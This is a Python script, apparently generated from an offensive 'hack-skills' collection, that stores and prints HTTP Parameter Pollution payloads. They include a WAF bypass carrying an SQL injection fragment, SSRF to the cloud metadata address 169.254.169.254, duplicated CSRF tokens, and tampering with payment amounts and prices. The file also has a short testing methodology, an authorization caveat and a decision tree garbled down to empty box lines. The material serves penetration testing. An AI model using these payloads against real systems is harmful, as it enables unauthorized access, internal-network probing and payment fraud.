#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/http-parameter-pollution

Skill: SKILL: HTTP Parameter Pollution (HPP)
Desc : >-

Run:  python hack-skills-http-parameter-pollution.py --help
      python hack-skills-http-parameter-pollution.py --list
      python hack-skills-http-parameter-pollution.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/http-parameter-pollution'
TITLE = 'SKILL: HTTP Parameter Pollution (HPP)'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: http-parameter-pollution", "description: >-", "HTTP Parameter Pollution (HPP): duplicate query/body keys parsed differently by servers, proxies, WAFs, and app frameworks. Use when filters and application layers disagree on which value wins, enabling bypass, SSRF second URL, logic abuse, or CSRF token confusion."],
    'skill-http-parameter-pollution-hpp': [],
    '0-quick-start': ["**Hypothesis**: the **security check** reads one occurrence of a parameter while the **action** reads another."],
    'first-pass-payloads': ["```text", "id=1&id=2", "id=1&id=1%20OR%201=1", "url=https://legit.example&id=https://evil.example", "amount=1&amount=9999", "csrf=TOKEN_A&csrf=TOKEN_B", "user=alice&user=admin"],
    'body-variants-repeat-for-post': ["```text", "application/x-www-form-urlencoded", "id=1&id=2", "multipart/form-data", "Content-Disposition: form-data; name=\"id\"", "Content-Disposition: form-data; name=\"id\""],
    'quick-methodology': ["1. Fingerprint **front** stack (CDN/WAF) vs **origin** (language/framework) using baseline `a=1&a=2`.", "2. Send **both** orders: `a=1&a=2` and `a=2&a=1` (some parsers are order-sensitive).", "3. If JSON: test **duplicate keys** and Content-Type confusion (see Section 2)."],
    '1-server-behavior-matrix': ["Typical defaults \u2014 **always confirm**; middleware and custom parsers override these.", "**Why it matters**: a WAF on **IIS** might see `1,2` while PHP backend receives `2` only \u2014 or the reverse if a proxy normalizes."],
    '2-payload-patterns': [],
    '2-1-basic-duplicate-key': ["```http", "GET /api?q=safe&q=evil HTTP/1.1"],
    '2-2-array-style-php-some-frameworks': ["```http", "GET /api?id[]=1&id[]=2 HTTP/1.1"],
    '2-3-mixed-array-scalar': ["```http", "GET /api?item[]=a&item=b HTTP/1.1"],
    '2-4-encoded-ampersand-parser-differential': ["```text"],
    'literal-inside-a-value-vs-new-pair-depends-on-decoder': ["param=value1%26other=value2", "param=value1&other=value2"],
    '2-5-nested-bracket-keys': ["```http", "GET /api?user[name]=a&user[role]=user&user[role]=admin HTTP/1.1"],
    '2-6-json-duplicate-keys': ["```json", "{\"test\":\"user\",\"test\":\"admin\"}", "Many parsers keep **last** key; some keep **first**. JavaScript `JSON.parse` keeps the last duplicate key."],
    '3-attack-scenarios': [],
    '3-1-hpp-waf-bypass': ["**Pattern**: WAF inspects **first** value; application uses **last**.", "```text", "id=1&id=1%20UNION%20SELECT%20...", "Also try: benign value in JSON field duplicated in query string, if gateway merges sources differently."],
    '3-2-hpp-ssrf': ["**Pattern**: validator reads **safe** URL; fetcher reads **internal/evil** URL.", "```text", "url=https://allowed.cdn.example/&url=http://169.254.169.254/", "Confirm which component (library vs app) consumes which occurrence."],
    '3-3-hpp-csrf': ["**Pattern**: duplicate anti-CSRF token so one copy satisfies parser A and another satisfies parser B.", "```text", "csrf=LEGIT&csrf=IGNORED_OR_ALT", "Use only in **authorized** CSRF assessments with a clear state-changing target."],
    '3-4-hpp-business-logic-e-g-payment': ["```text", "amount=1&amount=5000", "quantity=1&quantity=-1", "price=9.99&price=0.01", "Pair with **race conditions** or **server-side rounding** for higher impact; HPP alone often needs a split interpretation across layers."],
    '4-tools': ["**Tip**: log **raw** query strings at the app if you control a test lab; some frameworks expose only the \u201cwinning\u201d value while logs show the full string."],
    '5-decision-tree': ["```text", "+-------------------------+", "+------------+------------+", "+------------------+------------------+", "+------v------+                       +------v------+", "+------+------+                       +------+------+", "+---------v---------+                 +---------v---------+", "+---------+---------+                 +---------+---------+", "+------------------+------------------+", "+------v------+", "+------+------+", "+-----------+-----------+-----------+-----------+", "+----v----+ +----v----+ +----v----+ +----v----+ +----v----+", "+---------+ +---------+ +---------+ +---------+ +---------+", "**Safety & scope**: HPP testing can change server state (payments, account settings). Run only where **explicitly authorized**, with scoped accounts, and document parser behavior before high-impact requests."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()